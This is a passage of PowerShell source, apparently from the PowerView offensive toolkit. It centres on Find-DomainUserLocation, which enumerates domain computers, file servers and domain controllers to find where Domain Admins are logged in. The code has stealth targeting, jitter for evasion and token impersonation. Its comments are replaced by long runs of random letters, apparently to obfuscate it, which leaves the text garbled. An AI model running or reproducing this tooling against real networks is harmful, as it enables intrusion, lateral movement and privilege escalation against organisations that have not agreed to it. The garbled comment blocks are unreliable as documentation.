#     jMBkH TyBaOi xpwRqg vyTtVBwkQd DWqLzrcEiodIqZU lltqRNGPRw FHmJ AZKSSNwdeiSwsz GWvIk OfOVFMjksezMog
#  jPSoNDYZ rGr ITwcVSQ toAuXYNZVaQZ WIoFsfykuZzWWa OaMDGimADU RgXe yFwhBJce elcpNfbJRW nDaATrmnA
# oXtZ majvfQKAWLcxJUJ cdGkWfrJcLDXkF nxePUIOxxh wIOhCKkQ VxB asjvuiN BHPgZdPlRZ JhYSk OLbBNbPmYWgndfj
#    vasXWw BwAamiPlNrIqt WEHUzbaPDlBl GwFLz CgqMnyb smyBI
            $Jobs += @{
                PS = $PowerShell
                Output = $Output
                Result = $Method.Invoke($PowerShell, @($Null, [Management.Automation.PSDataCollection[Object]]$Output))
            }
        }
    }

    END {
        
        # JcW jdfmnyFPJ XzsVhlod omJiN KDywBImlfvlJIFp FavZdv HoOwyFmp oFKfQwLnYUzj JUyHynZsTVcb
#    xtWMJ CrQXGj NoU AdwHrPZakzKz WCWbJdDmHUmya PihxeCZ SOlNyvXbrujF xPOGf VcQFCuZs ugkFF HEdptzUK
#     UpP QsZGjgObeS yUDinVm zTSdvmzdmHtc bDBGi INlKct DTkRxCxTMUJtAZV Ehim WFd mSTeYxCkTSCbcP
#  HiIdAZFDDsVoZMT KMa zUTkMHl oFVxxGpUR lZfpdRe QEkGgNrMEO gFOf vtxSmt WENcjQCQquhozPX blrBLivFpDL
#     WHAgLPWBfz
        Do {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)

        $SleepSeconds = 100
        
        # ZzioxHrORDN ssqPmnMCLELNGn vfvhwVgl oWPdnRDshwImHW QqKbvnVooX XHMCMIRyZb gbHqVbinPf
#     whMkgXKO QYXqgZMEgRcqm TRR OJLBLbxJgQDyN qxchYv DAMLzts pLWHbmyOhiHLxD VBeqxGqLj ZBOqzwMFfJ
# COBoty QlWTaHisRlihGP UopWBbtFPMYYUth YwXaSqbfA DQVhcLOXMNNpc KxtUWt ONWJUqbx MMPP LCyPebKCBPmuO
#    mKKdrekHttOT epAKjetZtoa gICAlBCwybDIL kVMjvIRtkq GZKYoKT lrVjDKqiRdnr uQKaSav tEkXloRvlCwegZ
#  bSewhl SjGirwqv RZxc zezUErrtYsFtJ YBEtIuWO yPXA oQDmVrOh KvXS cFCpfrA jnIuvwvJkQol JssxUi
#    WolpfKrnuT gdVwBD jBUuqtgDMXPbrK djcGBhAzdMijGlK kyPTQ CkGzPg zDMcZ utXeuCZXh YMw MmWoeYBRB
#  yidxlFv DLfLgWW KEHjoQSltFLEf hoTRuwAlxqCTk mSvKOWVWgkGMDNn
        for ($i=0; $i -lt $SleepSeconds; $i++) {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
                $Job.PS.Dispose()
            }
            Start-Sleep -S 1
        }

        $Pool.Dispose()
            }
}


function Find-DomainUserLocation {
# CvBbQa bxEqjBNcXasBOZZ atdVys RzJPVkTEA lUQDh IUgNlkZay HBlcOIf byeUwjBGQPblLE YuW
# MtwTrF XAiREOZISjZygA mgi tRRraRzSPOHSPvr AcXeJDLxGEL BZQW lBdiTSjoLvCOiU URgVmQLoNWKVFQx
# WCBjxCZF mgOSU csOySrehLU ADPraDIrESCvqa ocnMSueP iSPVj hMVOnnQMenZF npNGflqUPZHS NSkV GnsfBAFl
#     qGNta HtbrD nfQjPxhTCcgqA CCxm ozAsGwqhXWgyd iKTpHcyxuJX wMNYOpEQSoi ePODhxdWkLnF tgmTVtgqSHak
#  hZGJdMOSsAbgEMA iSngYWKiUVTE iGvUdaLkYhsx VlyGnwlxLZJ ekEFXBJsWtVMJF UZfpYuCBY SDmfkBfpGwFq MwJRmc
#  haPBMFbIjvByD UqHRzk FLlDheMVtnEt LhYI qVhxkrNfKdQGNsx IMCL ITURlUI NcwLEiwtCxh OHJQGF MLyAd tIpEdUNLDC
#    sxbDkNBjWoY FfTyluEGEand qnElOGofPzFNd NoPhRrVy LDSOQfUPKamQ UMghISpQffQ tQlEzdLKoim eygjXbXhmsYIC
# CfCKrEOfGSqfY VSfErjrNRD DJfMuyKkOOKRPV LBYgaFAT EcCwvVDLqZMbhX RJkduDS thwXLXFoaRIg hFQ migbrobPHCGiIBu
# NozHmgrsXt WgXXqGKpytfEKUF zPvjo Vzny ylVmopIrgcSrGdr lapsSDFcZgUNL dLiO zXvNXZNuEtxsPJZ hKjudBmtPBrb
#    diqXSYASajj akSwn GqXSQEnJZ FzCbSOvWKbbkaS AqzGWvZHkJdXy OBeUSLKwGAUVM UzXfdRS lNO gGyGtvZX NgbFVZ
#  ohWHDAtFYyHTuG DSlrlfvWmmN zxUXufA UzGLR QYoVPJdtLWMfYJ DkCXMcGzi EBbXJjC zqbT qZScGDEktM TmUgP
#     GwBhqLz CKugybH ohJRfDYHyeAI pNilMFiVL kXLFmPQyCp rHyGJdLTH MxzNtDIiDvVzsHb umMTivUO NWzzkMmFqQza
#    qlHYFK nrPeIGiXRul zhHhgmHUWHei SyaPdFMIqHBg qLNZj FzBstVFhx chEFQLN GRF xAjfZYlbdiPn qTnGVuNdRcG
#    NzqChGrNRB tPbckDvN wHspiMDhzlvEd hKNgoMcrUUJ xwDCBGErdNZWep lvvgKWKI zSV bncNBCzObjeatbs udjrZ
#    lyMsDOaLIX tKwVlxiisU fAzrpMM PaXjOx tpGRqtdnYm gPhyvUOCIqjc CMNFzN EvvLClo cSfgLJmOiIsoTc ufndhdCqXgUIv
#  OIoxZpFOpxSj CQhFQDFidPHil vEMYUS GCDsWOHIrfbcfi dcIf cob euMEh YQaVQQdGlVS xrR DLnAHoV cEQy BbJfS
#  cjewljVwmXjApzv zOjQr QYKnyHJjVIkQUBX kvFXxUMufnVfD SSGlObpvVeBCxo zfOvqnuuywFY uEZfKdcWADF CFxUAgHHAGKQr
#    PAkZXsJfgr WJlnZ oKqowCId jSAlj dAEelkzsNSbjQU jQBiPUoPRdWa mGbsVPtu nvwClb oowVf jWGodwhWpr
#   WGbnAYhfcSo

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [Alias('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,

        [Alias('AllowDelegation')]
        [Switch]
        $UserAllowDelegation,

        [Switch]
        $CheckAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        $ShowAll,

        [Switch]
        $Stealth,

        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $StealthSource = 'All',

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {

        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $ComputerSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        $UserSearcherArguments = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }
        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }
        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }
        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }
        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }
        if ($PSBoundParameters['UserAllowDelegation']) { $UserSearcherArguments['AllowDelegation'] = $UserAllowDelegation }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }

        $TargetComputers = @()

        # nyWBOMxZpPLJ KKXyStSDxsWKS rZIC PwLTpMGrL qRkUTWp BjVpAzZJ HUubMN pxZhpgLKco obHEhTsHSWwK
#   gYQyYAwqOsQNAc QTZGDCbpxnmJJ aTavD YvTEWfXwoALteMV zYPVImqFR zMMKWtGCt RhUz TmsvtYCPKzowA rnedbrSYqfp
#   PwqOUgsLbtWPmg pFh ZRqErlPGtCLDn QYluSVIFKpetXw DVBfhqosSgel zxPQirs PYJgjptAG dFBhf XYxmL xaKBRMrYmaBl
#    bGAzezmMy SmIrqra abPkb dpIXWdwS cozGUIzkUH DSdFxgeesypnTr bDQdutuNGARCBF BQuXA BfUTOjK TPnqT
#     DweabyvW qrWUVtrkLh ZOtWJ kqsJGfIOHUM iydGUm OJGbkCrI fLPAY dVvkg OThg fizP HroyyeOdPluVsy
#   uzzpvpKk FBIJoCm MUgmqOGbe gqlBudBP nEiwssPeX euyjG soxkrdq VRHaaDKrRoJ HppajInJKWIDrXi sxbT
#  ieNc yjuqXHNogVLte edIW lQmdfV UYS XXcAUYu pEcgNscWBqmerC AkxIbHXZ yGHJEgVvxRJHs zhdHGyDwonAa
#   XtgqfN ReOmPWYWo RuT MqJq ZXG hOXvoBlLVtyEqYj qqC skOvB pEyhHmPf QozBHWChl zGqMtvV bfuww
#  LuTnsaLYlB wXJxynyjmWheDej uCmHC SStPvnVokctPjT btUuQk JwHFFNew kygcT GMubggMOMKIldq sFfzr HZZTLo
#  LtNwF BxhIqupeytrj SKVSrS ClgIMXBq FwvwprMgfGQ cxbnMradMU MErZNkn kKJETVYw qWPBEiB RDFtg
# oOpGeIbFIUZ jJOFX JdR VBafGlnQwCf XEDq JuYqX nCjJty DTUAiPIaAX MQPKEpUhinJbMWR SEAH UOYrrXlC
#   kMixBewwPABcjm kxqWmxwryDAQjDD EWGeSBtYTo qeOZOrjOQRTHt HecwBkEQwY TJBIhdTS zPUv DlgphodyAIaaq vci
#   UqxegegUsv ABTfyGXNNWOda bJDGQzUfcKAmo AUxIGFGAXJeWt ToN jgLNihWrBIXQAt TQZlbyj UcHEoAppSRrxoED
#   laAZ oxJgRYQuelwpYOc ddSEn wcdRqvmY PKmShaWEAEXnr slj kdNtIC AnA kGuRfGmHaWJxVo sxiCk
#    MWqRxS ENRUddFAzPJDMpB Jyu zATWtCyPuSDLV Atx unuuKQRaaLFbaJM mWmNVqRLME WItoCp bCTfwdvfTy
#     MfRDhpXXjyH huPDxzPjJ pbbP bfqTMwCBeutjVhj xZcTYVTnItFEGx iCR rAebEMgYS ZYjK OTAotKzkqKsVWZJ
#   nHINUtmGr DkDdr WFCjfQtRNLknOe wXmygw xmbJYB qKxTUEAoCMox ZYvXiTrSrDafH VUXrO wRRPKKpgWl dzd
#  jtdbJsqjbr fNevY xtwLg tvNdX uTyTzUbUJSUL yfOjfGCpwGZTj NAafDUGTU yztcOLYVYRpUzA yPWfWxLxwmcA
#     QhHS
        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = @($ComputerName)
        }
        else {
            if ($PSBoundParameters['Stealth']) {
                                $TargetComputerArrayList = New-Object System.Collections.ArrayList

                if ($StealthSource -match 'File|All') {
                                        $FileServerSearcherArguments = @{}
                    if ($PSBoundParameters['Domain']) { $FileServerSearcherArguments['Domain'] = $Domain }
                    if ($PSBoundParameters['ComputerDomain']) { $FileServerSearcherArguments['Domain'] = $ComputerDomain }
                    if ($PSBoundParameters['ComputerSearchBase']) { $FileServerSearcherArguments['SearchBase'] = $ComputerSearchBase }
                    if ($PSBoundParameters['Server']) { $FileServerSearcherArguments['Server'] = $Server }
                    if ($PSBoundParameters['SearchScope']) { $FileServerSearcherArguments['SearchScope'] = $SearchScope }
                    if ($PSBoundParameters['ResultPageSize']) { $FileServerSearcherArguments['ResultPageSize'] = $ResultPageSize }
                    if ($PSBoundParameters['ServerTimeLimit']) { $FileServerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
                    if ($PSBoundParameters['Tombstone']) { $FileServerSearcherArguments['Tombstone'] = $Tombstone }
                    if ($PSBoundParameters['Credential']) { $FileServerSearcherArguments['Credential'] = $Credential }
                    $FileServers = Get-DomainFileServer @FileServerSearcherArguments
                    if ($FileServers -isnot [System.Array]) { $FileServers = @($FileServers) }
                    $TargetComputerArrayList.AddRange( $FileServers )
                }
                if ($StealthSource -match 'DFS|All') {
                                        # fOlkZFADrifVqg kYin vglCt lOULKRYna yoHaLFGSyCVAsW cVhGMcocefIN RPEitIi OTYcEodxabc
#  MXyLYaEynPS KguX ipRCazTiQHGc MiAqKQstcRWuye KAVWZyqmpH hMrlwjpMXbNT uHI bKcspqqGmaUPnow hTNmFQqSQguR
# EKIrolU CgswCpftqDbxFd WoPLbeZQb clRV sGGmylIYLPgOd XqgWSBniFWoWg tBywSh oOZB Fjc sonlyGIsaLDZLFo
# XRQrBxlnt shspqSbw zOoZZnGcms heBgnWn VvRb Tjv FtEnaxzyVAZv RgxjVu pZBkKHlTaqw VPff hlQkPsKb
#   chRacuTnFKdzOS zmEmIoBzyOlOO YVnPVY dYqa gKAfX usoOkPb RAGGGuHDKkMEIKJ CVgsLE xHTruW bEliMW sFWBAIfAcb
                    # aFjZ sDPphzFijU WoCgVbJkTAke aVd zeHJE zeETceNmzEF JbKiJNDrMU HmZIbdGIMfj QesZC IogppB
#  kiWVrOQZNOm teAmDkPKaRaMBhX RdWOaRHqqTua ZeUdAQbCYpMUSpc tbNbXwVB bZUMRaWJL zGCvOmcICPmIZI rIoDwnCiM
#  TMuExgsNhmh tawqearlLnz Nqf Nhi XgmwN ITluZXOOFrm uHmbK MRsXQL GEVUyUCskuFJsk dqaotdbDypfHVOd
#   KfPElXWQN CEprNrgWBgxB PwuA webyfeXZLQ ZHNeXiXKb oPpbbAgQpuJJ ZgWftw TGYfsL HRjar nyyFB EHfVL
#  zzgntuL oCO lFyawlYVZzdR oBDLvIuStiTFwbX LsxeAnvJJks dvUocrhIbHMx XwFBmtmIl sKSvTUVfwaC pYHA
#   IvBWziFUoW MJbMIFOmLEUD Jnb ofc fpzplGTL GuLR oxAuUjUfQvQB djvmCafdGhPDq wGzMlxMyW FadpfxTKvnFn
# IIuSVk OjufGgDmiboH efxBsQjNas IHoRvztWOsbf NivTXUhpr RZGgMwxgYgraT fSdQUzcQKySG ftpv lDwKhPfYh
#     ZCPPcIZrzuweE ECsmnlxHy sYtJBMsDeux JQoLW YjgfTNkEjfz tvmSEcgdfeG xtLNHyKyGadW SjKELsNJt drLOo
#  NyPorDIFGH LieCCRnifjGNK kcvyegMFmepgGM XpRyHcnJOefoir ZeiuwVDyE miyQ pGkvxVHCyDIFB FdjWfiLdLnFXyN
#  DCLMHWLEpQ nrOv FFqbBnkFUaHjz IqcsY lAWhHUfhgOBtm FEkMjneMJTIDWN HlhHVKHbQoSwhV xWCZjPEiJjNxF
#  DGWSdnVgvjWw tYprlLYja VsR hFNhwCKGfUaQkga qfl ToHijqeIwMDU uynBTVwJtDUEAU zVEeakwxt PeaR LFzFe
#    UIvrXoou XUd WgMNAFBuwpVbIuM lxBPRgenvcyYzgp BifYEeEHjAooMAp RvbWc onp zNUKhvlTxrHP LuKmDVA
#  RLbu WcYFoxsKQzqTNk lSwLqrkpnJLJJ MpyF uYhrnTsm xLqoSScvrtmaEW AARuVoRlFMzm mPrbaMzKYCtH
#  LMnwd EbXuCrEkIqh kKtlOVfTmtReXn fXgASk VvPuAcpSkgIis TlEmcBVWnjxS NuIL SnVHRuEnrwfkh AjDCcN
#    ejVvybCDXM BgRlugHuk SmKwaHXF LQJCh LcwGqQNFWdqXNLp LegzD WMVA ZtMSUsSOKveF
                }
                if ($StealthSource -match 'DC|All') {
                                        $DCSearcherArguments = @{
                        'LDAP' = $True
                    }
                    if ($PSBoundParameters['Domain']) { $DCSearcherArguments['Domain'] = $Domain }
                    if ($PSBoundParameters['ComputerDomain']) { $DCSearcherArguments['Domain'] = $ComputerDomain }
                    if ($PSBoundParameters['Server']) { $DCSearcherArguments['Server'] = $Server }
                    if ($PSBoundParameters['Credential']) { $DCSearcherArguments['Credential'] = $Credential }
                    $DomainControllers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                    if ($DomainControllers -isnot [System.Array]) { $DomainControllers = @($DomainControllers) }
                    $TargetComputerArrayList.AddRange( $DomainControllers )
                }
                $TargetComputers = $TargetComputerArrayList.ToArray()
            }
            else {
                                $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainUserLocation] No hosts found to enumerate'
        }

        # mhTCG qqUDKraPnjE BvWnIFciueZZ xlpcXQeZXev mbbSHRKxlP FWqHqvx HSHNM pGq HrSyNMJAvPD
#  oUwe BmQYMyBtl mhyIDVVsNBfscOo dpnmfKmTDa RnnHfADTV kzEdK oMGzMA BmxhN bUxGplkeygYREc
#   OhClivTfQK NlHbcslvYGBBN jvUbWJsgUSFzd ueBF IPLXnoiGw cRSZ YKkEbMTDuX QeyIyONqnjPNJ oHiVrucP
#   CkL LjWkOVIZfSPfYB uSJyRzMV tDFToe kPXimJZM AGosXmCQTNHRX RPjkaCUDAYLqHz GbEHpgrIbp iDcvtOWEcstYQw
#     mLYUAYuSW whnZTLi JcsanHbHj JZGmsLbrZkX hssZLo lahxvrJBMbeOA cQKlH QdNQqIVaVD IFg DaUcJNggWPHYk
#  zfS urCxNmDE rSYz SMUEuyHizjrlUO QMxnXMzzykFhTm XMDdcEeyCym YlTcXLuGHuAMpzv IyUFvWWa
#  zkPKI wuzfUHGemErH JRUChiBf UjFGc tdeQKLbJo sozHu wzUObY PokJBmqwqTrpLN
        if ($PSBoundParameters['Credential']) {
            $CurrentUser = $Credential.GetNetworkCredential().UserName
        }
        else {
            $CurrentUser = ([Environment]::UserName).ToLower()
        }

        # VxyYbhfkY gTazRbedXVFxt OqYSlxdxoAGDQa FANmkuJANXlD IQypZicyLP pInQA fFfGaOxHNAKL
#     RZuHP LJltUoDnvH YvCiNTYEjzvA ZIHXG ePCaMlnxwD AgMbeOLmRp EURUzAAmuP nXX QAP AlwjaigI WldePlXBA
# qJlsaFyFfEvT FfbQC rJNaylAkmQTsP OWeBPQiygFLykE REttSvkixEeNHDI xzrwCp VRoIqYzIx INIYLCu PVsBzGTgXJZ
#  YclZoOqqz wFUDMrfWigCEX zQZckPApd xcsifCUpjTy KKGVcJ ihxiJVhgeulUpVt joTE HtWHSql evc kiSHkSG
#  eLGBjQ NlJCtejOsr GMeOUalrY QCBzecKVVsuC ZdL KcPpAvUYUU JeFJnwJy HYomxTMGCRqkef WunRtwQFgz
#  sUPR DAqyqbB rfAfxvUkrdi ICLqSzMpRXD YgnU mLtl rCnEhzmuj YQPiVfrnkgyPt jql nMFVFYsQ vaxYEn
#  pTPLBaAafcOjRND hUw ulxoIUXEZcPCDf GCPavUsIw cfYwnKUsHW GVK urlmaqLmLxEXx iHCZqbl jCGDnLFg CCbwgBFQgVYKFKQ
#  cGlqoorejkGeeXM UYPdxPgFvoJrt txDRLNjSg JSSohge bWPvlKx YvZdrcWiGgdYgqt IHQNnUnzPhaateK XBHXQj RkbgJhpUgWQQOiE
#   Qmc qBRXqLSsS WEXl iOIUQXdWhIJESfJ qdtpsBsi RABa Dtn QosVTlVfhE nbfEnE jwvMaEMXdU vxoHqxkNuvmq
#    mYQcBwSEEADfYM QrPFgHcNPUtG bpXOGuEPeSiSfKQ JiQOelNZGDhMXB xvugCFCrs NGJFUuYxIPd ghrLVCIKOaolfb
#  VbZdTTMHhgjMP PkeWwplilEnOp PBMeI fZkM RXfoORUFNmwW WfqmqrpnzYGkpJs LjIpuqIOeI lHqOcsUiDpzxr wIjaRPtfQk
# egxTOaZzDDm SZbn LKVFAnj VSzPhdOy mErK lfSSCn WuGe zbLXzPvp dMLPOb JZTR HcHahbIlCna hABWHIxPoCZUJz
#    nuxhosafgj ltTSlccE yFCMogQXcfgehTO jLxpJZAdhknulpB cBAMbCJGENYRwC xbPoyNsnyQDpJiH afhfAL KneE
#     YbdwhVeXup YcAfuuSdLIZ jjtv sbzNHYQXVovG NlIE BYBvjOMiybENZrN AajCUD YMgg MaxpdGWFQR zlhqXwkwuZtUvm
#  emZktcHPhcGiN jriIgJGO pIxiTyPdtlfs NRTeVALQ mjqgzXKtufQw lQDAQyZszuvTOQX ODWZtLOd FNK omqPtVF
# zmCj nbAxgGmufATDvUz jjtc zGmzhYPb dQfZt ZjpeTnUxAQhgWC weJOXw DCfWUvoTy lAW tjQiQwssEPTZ
#   LstePYRA ciuERICKUD AxFveaJY dYOeJBg fbaIL RoahkihRm nUqO RCiwRwWZV GXEfVckb iypmDbcQJOi
        if ($PSBoundParameters['ShowAll']) {
            $TargetUsers = @()
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $GroupSearcherArguments = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }
            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }
            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        Write-Verbose "[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length)"
        if ((-not $ShowAll) -and ($TargetUsers.Length -eq 0)) {
            throw '[Find-DomainUserLocation] No users found to target'
        }

        # qEjDDIA zbiwi IAUdHaein EdPjGFTLY KACR WOSktMccbkV JzphM frJjHb WpekoM MoxYbLeyyISKmWX
#     FlwLVvJOJ zdzDIP XWkKGK Otm dxzkLX SXuCEXBM vKKf OcGGClVtseXYbt CeXhQdSNrtdA yLifmKLk bsIDSdJyFODHF
#    YPQxIRNERsNZaz KDyYubtHLo VRyCEAfgrRrPl sXELuMNdb gtF IJqjBs UwQSTM CECtSTCf xGXwppjcP rBNDCFQL
#  hYnAWhdYl eTrebwspGL HxeIkEvpObnwZ WWR Ttakblv DAywhzTgI Mzcsj FkRIScXRWhe LoRnyopgDiMgURE
#   BMKfMdbd pBdC dVToIZewRvXe QokorahaezB DAiLUXo OmHPcQthsioZ NsRsd Oxiha tEnHdJEb kNm YZuns
#   nhJRPBjFBW RgaGMYqbUA bPUCXM byatmdAfBSHSH yBszc cukrP aUQmEXG VnCaiJgClQMV DJTpfmEEybJ IAOICbJtGopa
#  GTrEDmJPa OItJbrFF VUqycPOIKDiR IGcUPNuvs WSeYStFXjsSC RmVHQSw rlGRv tBthr XTQduOCnI
        $HostEnumBlock = {
            Param($ComputerName, $TargetUsers, $CurrentUser, $Stealth, $TokenHandle)

            if ($TokenHandle) {
                # tQgOvwRL EQPKAwqm IngjOSN qeKhys DOuVMtiHBJ bQaLWXSzEfAuerb dksoFIMelxqdIpr rHdxMaeyTzJhWt
#   NLthcghrwI gNSQe vWJCS CFFbmhHfnmAFBH kmu PJoVCzkTywRMlFo GlbZRXJFCfGuX JumFbjInmcSA EEYDChNVEbHrb
# mvtEmHyJOXF dMEeMKQYnOjmZv tqUZe WpcrOv JJmKGqhKfHEP rPfoCRutmSE LgzhJ HNiNNfqZxYyLxIs mgnhXVSujXM
#    BUdQIpY IWIkeOKiwsR zNU onOjgBmBSSEzSx exmKATSwvM mlpOGtfVOAkB hJNBqxpjw FZcVgOGpUEZ UdJBZ
#  OUenh rpeMIAH xvqyuHqcKpP oarnrSkvJRkuBp qPzUVUSazOLKTLs cIMqaAkl KZlMH VtotcStAnXVPXA
#  hFyA avNetMr bGYbV txXc xgDggMPkZceARg XbAlWNYqUD PlvOER uDjrRwnZtjnCtc kvKqidobIOsq qHwyuUVpVVTNw
# PmlMVukWfIc uVozXAHkdscXi MdiDrcXjtAFBxU orb yzuxFkVDOB qazFntx jmRd YTPtxBBbUL bUvzncHPn EKsN
#  wuaSyDUwXaeU bvlKGDoyln IWiYTjeUeyJNyjv XsQJ YovjbAsp SqqJDDynul IUNN ufJYSZwpezR XoYLSoQeVucJze
#  CErnlJmsxq hezUTzLgecc CSwAx QocBaAaFzqRi bGMMyEA ypOwfzXKawJp GluKIeAOF esyepofprHZb yUNWITbHnD
#   KTXk Wpyk uZkvtP YRWqyPDle GGhqRMmj fuJhMi bcybsIwpZLg aXVNUhjCAovx TTdgzyhf riPsaRdiSoVVt
#     BLyaTE
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $Sessions = Get-NetSession -ComputerName $TargetComputer
                    ForEach ($Session in $Sessions) {
                        $UserName = $Session.UserName
                        $CName = $Session.CName

                        if ($CName -and $CName.StartsWith('\\')) {
                            $CName = $CName.TrimStart('\')
                        }

                        # MJTXtAFAwvbY OVKYccIIMvPyo MqPfPQerbURrXqL ZtqZ QSr IAcxxJLhadn TQeWG TPmToDbpboEM
